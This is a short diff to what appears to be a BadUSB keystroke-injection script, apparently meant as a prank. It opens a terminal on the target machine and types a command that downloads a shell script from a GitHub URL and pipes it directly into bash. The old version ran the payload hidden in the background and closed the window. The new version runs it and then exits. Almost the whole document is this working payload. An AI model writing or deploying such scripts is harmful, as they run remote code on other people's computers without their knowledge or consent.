@@ -1,5 +1,3 @@
 CTRL-ALT t
 DELAY 2000
-STRING (setsid wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/sounds.sh | bash &)
-DELAY 200
-ALT F4
+STRING wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/sounds.sh | bash && exit
